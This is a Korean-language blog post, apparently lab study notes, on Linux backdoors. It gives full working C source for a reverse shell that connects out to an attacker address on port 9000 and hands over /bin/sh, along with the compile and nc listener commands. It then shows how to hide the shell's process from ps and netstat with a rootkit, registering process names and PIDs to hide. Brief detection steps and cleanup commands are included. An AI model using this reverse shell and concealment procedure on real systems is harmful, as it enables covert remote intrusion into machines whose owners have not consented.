---
title:  "backdoor-linux" 

categories:
  - 악성코드
tags:
  - [backdoor,linux]

toc: true

date: 2022-10-18
last_modified_at: 2022-10-18
---

## backdoor - linux

- 정상 인증을 거치지 않고 시스템에 접근

- local backdoor      : 관리자의 권한을 취득

- remote backdoor  : 인증없이 접근



- 구성도

- nc 실행하여 설치 되어있는지 확인

  ```
  [root@localhost ~]# nc
  ```

  ![화면 캡처 2022-10-18 191131](../../assets/img/화면 캡처 2022-10-18 191131.png)

- 공격대상에 백도어+ 쉘 소스코드생성

  ```
  [root@localhost ~]# vim /root/reverse_shell.c
  
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <netdb.h>
  #include <unistd.h>
  #include <errno.h>
  int main(int argc, char* argv[])
  {
          struct sockaddr_in server_addr;
          int server_sock;
          int client_len;
          char buf[80];
          char rbuf[80];
          char *cmd[2] = {"/bin/sh",(char *)0};
          server_sock = socket(AF_INET, SOCK_STREAM, 6);
          server_addr.sin_family =  AF_INET;
          server_addr.sin_addr.s_addr = inet_addr("공격자주소");
          server_addr.sin_port = htons(atoi("9000"));
          client_len =  sizeof(server_addr);
          connect(server_sock,(struct sockaddr *) &server_addr, client_len);
          dup2(server_sock, 0);
          dup2(server_sock, 1);
          dup2(server_sock, 2);
          execve("/bin/sh", cmd, 0);
          return 0;
  }
  ```

  ![화면 캡처 2022-10-18 191017](../../assets/img/화면 캡처 2022-10-18 191017.png)

- 쉘 소스코드 컴파일

  ```
  [root@localhost ~]# gcc -o reverse_shell reverse_shell.c
  [root@localhost ~]# ls reverse_shell
  ```

  ![화면 캡처 2022-10-18 191517](../../assets/img/화면 캡처 2022-10-18 191517.png)

- 공격자]  nc 실행

  ```
  [root@localhost ~]# nc -l 9000
  ```

- 공격 대상] reverse_backdoor 실행

  ```
  [root@localhost ~]# ./reverse_shell
  ```

- 공격자] 공격 대상 연결 확인

  ```
  /sbin/ifconfig
  ```

  ![화면 캡처 2022-10-18 192217](../../assets/img/화면 캡처 2022-10-18 192217-1666088675046-5.png)

  > 공격자 에게  공격 대상과 연결 되면서 사용할 shell 이 제공됨  remote backdoor + shell 

- 공격대상] backdoor check

  - 프로세스 확인

    ```
    [root@localhost ~]# ps -ef
    ```

    ![화면 캡처 2022-10-18 194900](../../assets/img/화면 캡처 2022-10-18 194900.png)

    > 의심되는 프로세스 확인

  - 포트 확인

    ```
    [root@localhost 바탕화면]# netstat -antup
    ```

    ![화면 캡처 2022-10-18 194658](../../assets/img/화면 캡처 2022-10-18 194658.png)

    > PID 번호가 아까 의심했던 프로세스와 일치

- 공격대상] 실행된 프로세스를 노출시키지 않도록 은닉

  - 관련 rootkit 복사

    ```
    [root@localhost tools]# cp -r /data/tools/white_rootkit /root/white_rootkit
    [root@localhost tools]# ls -al /root/white_rootkit/
    ```

    ![화면 캡처 2022-10-18 200224](../../assets/img/화면 캡처 2022-10-18 200224.png)

  - ps, netstat 파일 백업

    ```
    [root@localhost tools]# which ps
    /bin/ps
    [root@localhost tools]# which netstat
    /bin/netstat
    [root@localhost tools]# cp -p /bin/ps /root/ps.bak
    [root@localhost tools]# cp -p /bin/netstat /root/netstat.bak
    
    [root@localhost tools]# which ls
    alias ls='ls --color=auto'
    	/bin/ls
    [root@localhost tools]# cp -p /bin/ls /root/ls.bak
    ```

  - rootkit 디렉터리 출력시에 보이지 않도록 할 목록 파일

    ```
    [root@localhost tools]# cd /root/white_rootkit
    [root@localhost white_rootkit]# touch /root/white_rootkit/.white_psfile
    [root@localhost white_rootkit]# touch /root/white_rootkit/.white_netfile
    ```

  - make : gcc 관련 내용을 정의 - makefile

    ```
    [root@localhost white_rootkit]# ls
    ```

    ![화면 캡처 2022-10-18 200224](../../assets/img/화면 캡처 2022-10-18 200224-1666091482429-10.png)

    ```
    [root@localhost white_rootkit]# vim Makefile
    ```

    ![화면 캡처 2022-10-18 201225](../../assets/img/화면 캡처 2022-10-18 201225.png)

    ![화면 캡처 2022-10-18 201252](../../assets/img/화면 캡처 2022-10-18 201252.png)

  - make (default) : 컴파일

    ```
    [root@localhost white_rootkit]# make
    ```

    ![화면 캡처 2022-10-18 201802](../../assets/img/화면 캡처 2022-10-18 201802.png)

    ```
    [root@localhost white_rootkit]# ls white_*
    ```

    ![화면 캡처 2022-10-18 201852](../../assets/img/화면 캡처 2022-10-18 201852.png)

  - make install : Makefile 의 install 부분

    ```
    [root@localhost white_rootkit]# make install
    ```

    ![화면 캡처 2022-10-18 202017](../../assets/img/화면 캡처 2022-10-18 202017.png)

  - 없애고 싶은 프로세스의 이름을 등록

    ```
    ex) sh 들어간 프로세스는 보이지 않게 할것
    
    [root@localhost white_rootkit]# netstat -antup | grep sh
    ```

    ![화면 캡처 2022-10-18 202134](../../assets/img/화면 캡처 2022-10-18 202134.png)

    ```
    [root@localhost white_rootkit]# vim /dev/white_root/.white_netfile
    ```

    ![화면 캡처 2022-10-18 202250](../../../../../Desktop/블로그용 사진/backdoor 리눅스/화면 캡처 2022-10-18 202250.png)

  - 프로세스 확인

    ```
    [root@localhost white_rootkit]# netstat -antup | grep sh
    ```

    ![화면 캡처 2022-10-18 202413](../../assets/img/화면 캡처 2022-10-18 202413.png)

    > 결과 없음 (은닉 성공)

  - PID로 은닉

    ```
    [root@localhost white_rootkit]# vim /dev/white_root/.white_netfile 
    ```

    ![화면 캡처 2022-10-18 202539](../../assets/img/화면 캡처 2022-10-18 202539.png)

    ```
    [root@localhost white_rootkit]# netstat -antup | grep sh
    ```

    ![화면 캡처 2022-10-18 202632](../../assets/img/화면 캡처 2022-10-18 202632.png)

    ```
    [root@localhost white_rootkit]# ps -ef | grep 4628
    ```

    ![화면 캡처 2022-10-18 202726](../../assets/img/화면 캡처 2022-10-18 202726.png)

    > 프로세스중이지만 은닉중인것을 확인

  - ps -ef 에서 은닉

    ```
    [root@localhost white_rootkit]# vim /dev/white_root/.white_psfile
    ```

    ![화면 캡처 2022-10-18 203046](../../assets/img/화면 캡처 2022-10-18 203046.png)

    ```
    [root@localhost white_rootkit]# ps -ef | grep 5261
    ```

    ![화면 캡처 2022-10-18 203221](../../assets/img/화면 캡처 2022-10-18 203221.png)

    > 결과 없음 (은닉 성공)

  - 원상복구

    ```
    [root@localhost white_rootkit]# vim /root/white_rootkit/Makefile
    ```

    ![화면 캡처 2022-10-18 203643](../../assets/img/화면 캡처 2022-10-18 203643.png)

    ```
    [root@localhost white_rootkit]# make clean
    ```

    ![화면 캡처 2022-10-18 210340](../../assets/img/화면 캡처 2022-10-18 210340.png)

    ```
    [root@localhost white_rootkit]# make uninstall
    ```

    ![화면 캡처 2022-10-18 210428](../../assets/img/화면 캡처 2022-10-18 210428.png)

  - 

    

    

  

  

  

  